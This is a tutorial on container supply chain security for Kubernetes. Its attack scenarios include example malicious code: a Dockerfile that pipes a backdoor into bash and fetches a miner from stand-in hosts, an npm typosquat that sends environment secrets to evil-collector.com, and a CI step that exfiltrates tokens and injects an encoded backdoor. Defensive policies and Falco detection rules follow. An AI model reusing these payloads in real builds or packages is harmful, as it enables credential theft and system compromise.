# Container Supply Chain Security: From Source to Production

## Context & Problem

**Business Problem**: Container supply chain attacks target the build, storage, and deployment pipeline of containerized applications, allowing attackers to inject malicious code that reaches production systems at scale, compromising entire organizations through trusted channels.

**Real-World Impact**:
- **SolarWinds-style attacks**: Malicious code in trusted base images reaching thousands of organizations
- **DockerHub compromise**: Malicious images downloaded millions of times before detection
- **Dependency poisoning**: Compromised packages in language-specific registries (npm, PyPI, Maven)
- **Registry hijacking**: Attackers gaining control of container registries and pushing malicious updates

## First Principles: Understanding the Container Supply Chain

### The Complete Attack Surface
```
Source Code → Build Pipeline → Container Registry → Deployment → Runtime
     ↓             ↓                   ↓                ↓         ↓
Code Injection → Build Compromise → Registry Hijack → Deploy Malware → Execute Backdoor
```

### Critical Vulnerability Points
1. **Base Image Compromise**: Malicious or vulnerable base images
2. **Dependency Injection**: Compromised packages in application dependencies  
3. **Build Pipeline Compromise**: Malicious code injection during CI/CD
4. **Registry Attacks**: Unauthorized image pushes or registry compromise
5. **Image Tampering**: Modification of images in transit or at rest
6. **Deployment-time Attacks**: Malicious images deployed as trusted workloads

### Why Kubernetes Amplifies Supply Chain Risk
- **Scale**: Single malicious image can compromise hundreds of pods
- **Trust**: Container images often run with elevated privileges
- **Automation**: CI/CD systems automatically deploy compromised images
- **Persistence**: Malicious containers can establish persistent access

## Production Implementation: Supply Chain Attack Scenarios

### Scenario 1: Malicious Base Image Attack

#### Vulnerable Base Image Selection
```dockerfile
# ❌ DANGEROUS: Using unverified or community base images
FROM node:latest  # No tag pinning, vulnerable to tag poisoning
FROM alpine:latest  # Latest tag can be hijacked

# ❌ DANGEROUS: Using images from untrusted registries
FROM docker.io/suspicious-user/alpine:3.18

# ❌ DANGEROUS: No image verification
FROM ubuntu:20.04  # No signature or digest verification
```

#### Malicious Base Image Example (Educational)
```dockerfile
# WARNING: Example of compromised base image - NEVER use in production
FROM alpine:3.18
RUN apk add --no-cache curl bash

# MALICIOUS: Hidden backdoor installation
RUN curl -s http://malicious-server.com/backdoor.sh | bash

# MALICIOUS: Cryptocurrency miner installation  
RUN wget -qO- http://evil.com/miner | tar xz -C /usr/local/bin/

# MALICIOUS: Persistent access via cron
RUN echo '*/5 * * * * /usr/local/bin/backdoor' | crontab -

# Continue with normal image build to hide malicious activities
RUN apk add --no-cache nodejs npm
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
```

#### Kubernetes Deployment with Compromised Image
```yaml
# Unsuspecting deployment using compromised image
apiVersion: apps/v1
kind: Deployment
metadata:
  name: compromised-app
  namespace: production
spec:
  replicas: 10  # Malware now running on 10 pods
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      containers:
      - name: app
        image: compromised-registry.com/web-app:latest  # Contains malware
        ports:
        - containerPort: 3000
        env:
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: url
        # VULNERABILITY: Secrets now accessible to malware
        # VULNERABILITY: No image verification or scanning
```

### Scenario 2: Dependency Poisoning Attack

#### Vulnerable Package.json with Typosquatting
```json
{
  "name": "vulnerable-app",
  "version": "1.0.0",
  "dependencies": {
    "expres": "^4.18.0",     // ❌ Typo: should be "express"
    "lodash": "^4.17.20",    // ✅ Legitimate package
    "color": "^4.2.3",       // ❌ Should be "colors" - typosquatting
    "node-uuid": "^1.4.8"    // ❌ Deprecated, should use "uuid"
  }
}
```

#### Malicious Package Example
```javascript
// Inside malicious "expres" package
const originalExpress = require('express-original');

// MALICIOUS: Steal environment variables
function stealSecrets() {
    const secrets = {
        env: process.env,
        timestamp: new Date().toISOString(),
        hostname: require('os').hostname(),
        pid: process.pid
    };
    
    // Send to attacker's server
    require('https').request({
        hostname: 'evil-collector.com',
        path: '/collect',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }, () => {}).write(JSON.stringify(secrets));
}

// MALICIOUS: Backdoor in HTTP handler
module.exports = function() {
    const app = originalExpress();
    
    // Normal functionality
    const originalUse = app.use;
    app.use = function(...args) {
        // MALICIOUS: Log all requests to attacker
        if (args[0] && typeof args[0] === 'function') {
            const originalHandler = args[0];
            args[0] = function(req, res, next) {
                // Steal request data
                stealSecrets();
                return originalHandler(req, res, next);
            };
        }
        return originalUse.apply(this, args);
    };
    
    return app;
};

// Execute immediately when package is loaded
stealSecrets();
```

### Scenario 3: Build Pipeline Compromise

#### Compromised CI/CD Pipeline
```yaml
# .github/workflows/build.yml - Compromised CI pipeline
name: Build and Deploy
on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    # VULNERABILITY: Using compromised action
    - uses: malicious-actor/docker-build@v1  # Compromised action
      with:
        registry: ${{ secrets.DOCKER_REGISTRY }}
        username: ${{ secrets.DOCKER_USERNAME }}
        password: ${{ secrets.DOCKER_PASSWORD }}
    
    # MALICIOUS: Injected step by attacker
    - name: "Security Scan"  # Appears legitimate
      run: |
        # Download and execute malicious script
        curl -s https://security-tools.fake.com/scan.sh | bash
        
        # Steal repository secrets and source code
        env | grep -E "(SECRET|TOKEN|PASSWORD)" > /tmp/secrets.txt
        curl -X POST -d @/tmp/secrets.txt https://evil.com/collect
        
        # Inject backdoor into source code
        echo 'eval(atob("Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3I="))' >> src/app.js
    
    - name: Build Docker Image
      run: |
        docker build -t ${{ secrets.DOCKER_REGISTRY }}/app:${{ github.sha }} .
        docker push ${{ secrets.DOCKER_REGISTRY }}/app:${{ github.sha }}
```

## Troubleshooting Scenarios: "What happens when this breaks at 2AM?"

### Crisis Scenario 1: Widespread Malware Deployment
```bash
# Symptoms: Multiple pods showing suspicious network activity
kubectl get pods --all-namespaces -o wide | grep -v "Running\|Completed"

# Investigation: Check for malicious processes
kubectl exec -it suspicious-pod -- ps aux | grep -E "(curl|wget|nc|python|perl|bash)"

# Check network connections
kubectl exec -it suspicious-pod -- netstat -tulpn | grep ESTABLISHED

# Look for cryptocurrency mining indicators
kubectl top pods --all-namespaces --sort-by=cpu | head -20
kubectl exec -it high-cpu-pod -- ps aux | grep -E "(mine|crypto|xmr|eth)"

# Immediate response: Scale down affected deployments
for deployment in $(kubectl get deployments --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'); do
    if kubectl get deployment $deployment -o jsonpath='{.spec.template.spec.containers[0].image}' | grep -q "suspicious-registry"; then
        kubectl scale deployment $deployment --replicas=0
        echo "Scaled down suspicious deployment: $deployment"
    fi
done
```

### Crisis Scenario 2: Registry Compromise Detection
```bash
# Check for unauthorized image pushes
kubectl get events --all-namespaces --sort-by=.metadata.creationTimestamp | grep -i "pull\|image"

# Verify image signatures (if using cosign)
for pod in $(kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}:{.spec.containers[0].image}{"\n"}{end}'); do
    namespace=$(echo $pod | cut -d'/' -f1)
    name=$(echo $pod | cut -d'/' -f2 | cut -d':' -f1)
    image=$(echo $pod | cut -d':' -f2-)
    
    echo "Checking signature for $image in $namespace/$name"
    cosign verify --key cosign.pub $image || echo "❌ Signature verification failed for $image"
done

# Emergency response: Block suspicious registries
cat << EOF | kubectl apply -f -
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: emergency-block-registries
spec:
  validationFailureAction: enforce
  rules:
  - name: block-suspicious-registries
    match:
      any:
      - resources:
          kinds: ["Pod"]
    validate:
      message: "Images from suspicious registries are blocked"
      deny:
        conditions:
        - key: "{{ request.object.spec.containers[?contains(@.image, 'suspicious-registry.com')] | length(@) }}"
          operator: GreaterThan
          value: 0
EOF
```

## Evolution & Alternatives: Secure Supply Chain Practices

### Modern Supply Chain Security Stack

#### Layer 1: Secure Base Images and Dependencies
```dockerfile
# ✅ SECURE: Pinned, verified base images
FROM ubuntu:20.04@sha256:a06ae92523384c2cd182dcfe7f8b2bf09075062e937d5653d7d0db0375ad2221

# ✅ SECURE: Minimal distroless images
FROM gcr.io/distroless/nodejs:18@sha256:specific-digest

# ✅ SECURE: Package version pinning
FROM node:18.17.1-alpine3.18@sha256:specific-digest

# Security scanning in Dockerfile
RUN npm audit --audit-level=high
RUN npm ci --only=production

# Remove package managers and build tools in final image
RUN apk del npm
USER 1001
```

#### Layer 2: Supply Chain Security Tools Integration
```yaml
# Comprehensive supply chain security pipeline
apiVersion: tekton.dev/v1beta1
kind: Pipeline
metadata:
  name: secure-supply-chain
spec:
  params:
  - name: source-repo
  - name: image-registry
  tasks:
  
  # 1. Source code security scanning
  - name: source-scan
    taskRef:
      name: gitsecrets-scan
    params:
    - name: repo
      value: $(params.source-repo)
  
  # 2. Dependency scanning
  - name: dependency-scan
    taskRef:
      name: snyk-scan
    runAfter: ["source-scan"]
    params:
    - name: severity-threshold
      value: "high"
  
  # 3. Container build with security
  - name: secure-build
    taskRef:
      name: kaniko-build
    runAfter: ["dependency-scan"]
    params:
    - name: context
      value: $(params.source-repo)
    - name: image
      value: $(params.image-registry)/app:$(context.pipelineRun.uid)
  
  # 4. Image vulnerability scanning
  - name: image-scan
    taskRef:
      name: trivy-scan
    runAfter: ["secure-build"]
    params:
    - name: image
      value: $(params.image-registry)/app:$(context.pipelineRun.uid)
    - name: severity
      value: "HIGH,CRITICAL"
    - name: exit-code
      value: "1"
  
  # 5. Image signing
  - name: image-sign
    taskRef:
      name: cosign-sign
    runAfter: ["image-scan"]
    params:
    - name: image
      value: $(params.image-registry)/app:$(context.pipelineRun.uid)
  
  # 6. SBOM generation
  - name: generate-sbom
    taskRef:
      name: syft-sbom
    runAfter: ["image-sign"]
    params:
    - name: image
      value: $(params.image-registry)/app:$(context.pipelineRun.uid)
  
  # 7. Policy compliance check
  - name: policy-check
    taskRef:
      name: opa-conftest
    runAfter: ["generate-sbom"]
    params:
    - name: image
      value: $(params.image-registry)/app:$(context.pipelineRun.uid)
```

#### Layer 3: Runtime Supply Chain Protection
```yaml
# Admission controller for supply chain security
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: supply-chain-security
spec:
  validationFailureAction: enforce
  background: true
  rules:
  
  # Require signed images
  - name: require-signed-images
    match:
      any:
      - resources:
          kinds: ["Pod"]
    verifyImages:
    - imageReferences:
      - "*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----
  
  # Block images from untrusted registries
  - name: trusted-registries-only
    match:
      any:
      - resources:
          kinds: ["Pod"]
    validate:
      message: "Images must come from trusted registries"
      pattern:
        spec:
          containers:
          - image: "registry.company.com/*"
          
  # Require SBOM attestation
  - name: require-sbom
    match:
      any:
      - resources:
          kinds: ["Pod"]
    verifyImages:
    - imageReferences:
      - "*"
      attestations:
      - predicateType: "https://spdx.dev/Document"
        conditions:
        - all:
          - key: "{{ predicate.creationInfo.creators | length(@) }}"
            operator: GreaterThan
            value: 0
```

### Advanced Supply Chain Monitoring

#### Runtime Detection with Falco
```yaml
# Falco rules for supply chain attack detection
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-supply-chain-rules
data:
  supply-chain-rules.yaml: |
    - rule: Suspicious Package Installation
      desc: Detect package installation in running containers
      condition: >
        spawned_process and container and
        (proc.name in (apt, apt-get, yum, dnf, apk, pip, npm, yarn, gem))
      output: >
        Package installation in running container
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: WARNING
      
    - rule: Cryptocurrency Mining Activity
      desc: Detect cryptocurrency mining processes
      condition: >
        spawned_process and
        (proc.name contains "mine" or
         proc.name contains "xmr" or
         proc.cmdline contains "stratum" or
         proc.cmdline contains "pool")
      output: >
        Potential cryptocurrency mining detected
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: ERROR
      
    - rule: Suspicious Network Activity
      desc: Detect connections to suspicious domains
      condition: >
        outbound and
        (fd.rip matches ".*.tk" or
         fd.rip matches ".*.ml" or
         fd.rip contains "pastebin" or
         fd.rip contains "raw.githubusercontent")
      output: >
        Suspicious outbound connection
        (container=%container.name dest=%fd.rip dest_port=%fd.rport)
      priority: WARNING
      
    - rule: Container Escape Attempt
      desc: Detect container escape techniques
      condition: >
        spawned_process and container and
        (proc.name in (docker, runc, containerd) or
         proc.cmdline contains "chroot" or
         proc.cmdline contains "/proc/1/root")
      output: >
        Container escape attempt detected
        (container=%container.name process=%proc.name cmdline=%proc.cmdline)
      priority: ERROR
```

### Supply Chain Security Tools Setup

#### 1. Image Scanning with Trivy
```yaml
# Trivy operator for continuous image scanning
apiVersion: v1
kind: ConfigMap
metadata:
  name: trivy-operator-config
  namespace: trivy-system
data:
  trivy.severity: "HIGH,CRITICAL"
  trivy.ignoreUnfixed: "true"
  trivy.timeout: "300s"
  scanner.reportTTL: "24h"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: trivy-operator
  namespace: trivy-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: trivy-operator
  template:
    spec:
      containers:
      - name: trivy-operator
        image: aquasec/trivy-operator:latest
        env:
        - name: OPERATOR_NAMESPACE
          value: trivy-system
        - name: OPERATOR_TARGET_NAMESPACES
          value: "default,production"
```

#### 2. Image Signing with Cosign
```bash
# Generate signing keys
cosign generate-key-pair

# Sign container image
cosign sign --key cosign.key registry.company.com/app:latest

# Generate and sign SBOM
syft registry.company.com/app:latest -o spdx-json > app.sbom
cosign attest --predicate app.sbom --key cosign.key registry.company.com/app:latest

# Verify in admission controller
cat << EOF | kubectl apply -f -
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-signatures
spec:
  validationFailureAction: enforce
  rules:
  - name: verify-image-signature
    match:
      any:
      - resources:
          kinds: ["Pod"]
    verifyImages:
    - imageReferences:
      - "registry.company.com/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              $(cat cosign.pub)
EOF
```

## Next Steps: Building a Secure Supply Chain

### Production-Ready Security Measures

#### 1. Dependency Management
```json
{
  "name": "secure-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.18.2"  // Pinned versions only
  },
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "preinstall": "npm run audit"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}
```

#### 2. Secure Registry Setup
```yaml
# Private registry with access controls
apiVersion: v1
kind: Secret
metadata:
  name: registry-credentials
type: kubernetes.io/dockerconfigjson
data:
  .dockerconfigjson: <base64-encoded-docker-config>
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: registry-user
imagePullSecrets:
- name: registry-credentials
```

#### 3. Continuous Monitoring
```bash
# Monitor for supply chain indicators
kubectl get events --all-namespaces --watch | grep -E "(Failed|Error|Warning)"

# Regular security scanning
kubectl get vulnerabilityreports --all-namespaces
kubectl get configauditreports --all-namespaces

# Check for policy violations
kubectl get policyreports --all-namespaces
```

### Business Impact Measurement
- **Security**: Prevent malware injection and data breaches
- **Compliance**: Meet supply chain security requirements (SLSA, NIST)
- **Operational**: Reduce incident response costs and recovery time
- **Trust**: Maintain customer confidence in security practices

**Production Reality**: Supply chain attacks are increasingly sophisticated and can compromise thousands of organizations through a single malicious package or image. Implementing comprehensive supply chain security is essential for protecting against these evolving threats.